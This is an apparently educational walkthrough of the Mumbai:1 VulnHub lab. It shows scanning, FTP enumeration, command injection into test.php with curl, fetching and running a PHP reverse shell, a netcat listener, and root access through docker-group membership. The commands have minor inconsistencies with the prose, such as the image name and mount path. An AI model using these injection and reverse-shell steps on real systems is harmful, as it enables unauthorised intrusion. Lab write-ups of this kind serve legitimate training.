<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Mumbai:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mumbai1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-18T06:02:19+00:00">November 18, 2019</time><time class="updated" datetime="2025-06-10T20:10:56+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Mumbai:1 VM is made by Dylan Barker. This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of intermediate level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to get root and to read the root flag.</span></p>
<p><span style="color: #000000;"><strong>Level: Intermediate</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/mumbai-1,372/">link</a></strong>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap Port Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Anonymous FTP Login</span></li>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Scanning directories using Dirb Tool</span></li>
<li><span style="color: #000000;">Using Curl to send Get &amp; Post Request</span></li>
<li><span style="color: #000000;">Executing Python Script keywords.py</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploiting</strong></span>
<ul>
<li><span style="color: #000000;">Executing test.php using Curl</span></li>
<li><span style="color: #000000;">Fuzzing and Checking for RCE using Curl</span></li>
<li><span style="color: #000000;">Uploading PHP Reverse Shell</span></li>
<li><span style="color: #000000;">Getting User access on Netcat Listener</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Using Docker to get Root Access</span></li>
<li><span style="color: #000000;">Reading Final Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">Let’s start by scanning the network for targets using Netdiscover.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-LKPMISPfUxE/XdItpihvkgI/AAAAAAAAhT8/md_eNBgk0rUOXMcBU9PLyHq2STNV8cINwCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">We found the target IP Address 192.168.1.221. Let’s begin with basic port scanning with NMAP.</span></p>
<pre class="lang:default decode:true">nmap -A -p- 192.168.1.221</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hQekM9at0rI/XdItrvCYjCI/AAAAAAAAhUU/W5cL2oN9fswIcWnNbe26jlUpZJWOa00GQCLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">The Anonymous Login is allowed for FTP port 21 on the target machine. Then let’s begin enumerating the FTP port and look for some shared files. On enumeration, we found a file <strong>Note.</strong> We downloaded it on our system and read its contents. It surely is a clear hint for our next step.</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.221
ls
get Note
cat Note</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BnB0PTv0tek/XdItr0c7jDI/AAAAAAAAhUY/HdIMEeTaYY81fEDGqo3WCGo80BdZXZeygCLcBGAsYHQ/s1600/3.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">For more details, we will navigate to a web browser for exploring HTTP service since port 80 is open. It clearly is not enough for a clue to proceed.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BDGwxErORoc/XdItsHXAqQI/AAAAAAAAhUc/f7CDAXAi6b8a50hkNqViaK9tiYNaEmwiQCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">Recalling from the Nmap result, we thought of browsing Target’s IP Address along with port 8000. Since port 8000 depicts Nginx server is installed on the Target Machine.</span></p>
<pre class="lang:default decode:true">http://192.168.1.221:8000</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-P9P4Tr8AyN0/XdItsbh0RLI/AAAAAAAAhUg/YYCoCzICtTAc1gxTvGIg1Vy02b0L6GxcgCLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Till now we didn’t find any hint to establish our foothold, therefore we chose DIRB for directory brute force attack and found URL for <strong>drupal</strong> and <strong>wordpress</strong> directories. On browsing, these were just empty directories.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.221</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-9mWqJ8zicN0/XdItsrU6rGI/AAAAAAAAhUk/r3pePTZDZukb32MPW-C3VnjwKhVmHCo7gCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">It strikes us let’s look for specific file extensions over the target server in the directories. We discovered test.php and keywords.py files. The first thing to do is to read the contents of PHP files because they seem quite suspicious to us.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.221:8000 -X .php, .txt, .py</pre>
<p><strong><img decoding="async" src="https://1.bp.blogspot.com/-a17mXu2KxKM/XdIttk_jCsI/AAAAAAAAhUo/eHd5uhaSjNEjA2-NO77jtiJDfazfw-hGQCLcBGAsYHQ/s1600/7.png"/></strong></p>
<p><span style="color: #000000;">On sending a request to the Target Server to access <strong>test.php</strong>, we discovered it is asking us to make POST request for a proper query along with the URL.</span></p>
<pre class="lang:default decode:true">curl http://192.168.1.221:8000/test.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-n-cBuW5G-Ek/XdItt3AzrnI/AAAAAAAAhUs/IuQvXSFYOX8p4FJI9_XBTSvLO9xE_ApPQCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">Now let’s download the <strong>keywords.py</strong> file on our system and executed the script which gave information to proceed. We ran the script against few directories but wordpress gave us the actual understanding of the script. This script just stores words into a list and then counts how many times each word has occurred.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.221:8000/keywords.py
python3 keywords.py --help
python3 keywords.py --query http://192.168.1.221:8000/test.php
python3 keywords.py --query http://192.168.1.221/
python3 keywords.py --query http://192.168.1.221/drupal
python3 keywords.py --query http://192.168.1.221/wordpress</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lRFy-cVaaCk/XdItug3XVUI/AAAAAAAAhUw/-m_MS33zJAUj9UNsN6cz8r8716iYlEpxwCLcBGAsYHQ/s1600/9.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<p><span style="color: #000000;">We thought of sending a POST request to <strong>test.php </strong>as shown below. So the result shows test.php script is acting as a wrapper which is trying to pass data to keywords.py script and return the output back to the request. There are ways where we can try escaping this into RCE. Now, this is a Challenge. After intense fuzzing we finally escaped it with an RCE now, one final thing left is to get a shell.</span></p>
<pre class="lang:default decode:true">curl -d "query=http://192.168.1.221/wordpress" http://192.168.1.221:8000/test.php
curl -d "query=http://192.168.1.221/wordpress;id" http://192.168.1.221:8000/test.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-blGWXpBFYlA/XdItpjRkfcI/AAAAAAAAhUA/6KfO3R5igGoT_bf7JpaAYPCZSnA4R6zyQCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">After a little bit of playing around with our RCE, we did some enumeration and created a PHP Reverse Shell which we have uploaded from our machine to the target server to get the root. To get that we have executed the Php reverse shell along with that we have also executed a Netcat listener to establish a reverse connection.</span></p>
<pre class="lang:default decode:true">curl -d "query=http://192.168.1.221/wordpress;pwd;ls al" http://192.168.1.221:8000/test.php
curl -d "query=http://192.168.1.221/wordpress;wget http://192.168.1.221:8000/phpshell.php;ls -al" http://192.168.1.221:8000/test.php
curl -d "query=http://192.168.1.221/wordpress;php phpshell.php" http://192.168.1.221:8000/test.php</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-MjuHBxZ_nI4/XdItp330XQI/AAAAAAAAhUE/2W_7l_UkrUA1j6DkwncP6JzyXOzIbjIjgCLcBGAsYHQ/s1600/11.png"/></strong></span></p>
<p><span style="color: #000000;">Therefore we have got a half shell, we tried spawning it with our usual trick of using a TTY shell but nothing changed.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
id           
pwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-OPblqSk7CyY/XdItq8Fe-iI/AAAAAAAAhUI/E8X8L2RSCbAfPs1-FUZtUvT1Tq0WTDApQCLcBGAsYHQ/s1600/12.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">To proceed with our privilege escalation, we tried a few things but didn’t work out. In the end, to get our final flag, we used docker but there is an issue with the docker that all the commands in docker require sudo as docker needs root to run. The Docker daemon works in such a way that it is allowed access to the root user or any other user in the particular docker group. This shows that access to the docker group is the same as to give a perpetual, root access without any password. We ran the command shown below. This command obtains the alpine image from the Docker Hub Registry and runs it. The -v parameter specifies that we want to create a volume in the Docker instance. The -it parameters put the Docker into the shell mode rather than starting a daemon process. The instance is set up to mount the root filesystem of the target machine to the instance volume, so when the instance starts it immediately loads a chroot into that volume. This gives us the root of the machine. After running the command, we traverse into the /mnt directory and /ignite directory to found <strong>Proof.txt</strong>.</span></p>
<pre class="lang:default decode:true">docker run -it -v /root:/mnt/ignite ubuntu
cd /mnt
cd ignite
ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5NrvRny3Kq8/XdItqy0RrCI/AAAAAAAAhUM/a_skH7giWvsNFNMclM-Jgb8Z43TduGUdACLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">The final thing to do is to read the FLAG!!</span></p>
<pre class="lang:default decode:true">cat proof.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-iTpAZKSls0M/XdItrIOJnBI/AAAAAAAAhUQ/Oj9OekRox3kWAIF6NKk2n0Z5PJY_tg5hQCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 3 years in the field of security as a Penetration Tester and Security Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
